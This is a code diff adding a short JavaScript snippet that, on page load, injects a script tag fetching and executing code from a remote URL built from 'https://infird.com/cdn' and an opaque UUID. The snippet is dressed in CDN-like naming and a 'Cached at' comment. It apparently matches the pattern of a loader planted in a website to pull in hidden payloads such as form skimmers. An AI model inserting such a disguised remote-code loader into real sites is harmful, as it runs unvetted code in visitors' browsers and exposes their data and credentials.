@@ -1,0 +1,18 @@
+(function() {
+    const __s3scdn_uid = '5b0deaf5-bf13-4c33-a4e8-c91be936dd3b';
+    const __s3scdn_start = 1774637411499;
+
+    (function () {
+    const url = [
+        'https://infird.com/cdn',
+        '986df696-a484-42dc-a3ed-0466520e31dc',
+    ];
+    
+    const script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = url.join('/');
+    document.head.appendChild(script);
+})();
+
+    // Cached at 2026-04-06 07:12:23 - s:c8d3a069-77c7-41b6-927e-06a4c17fac35__PL
+})();
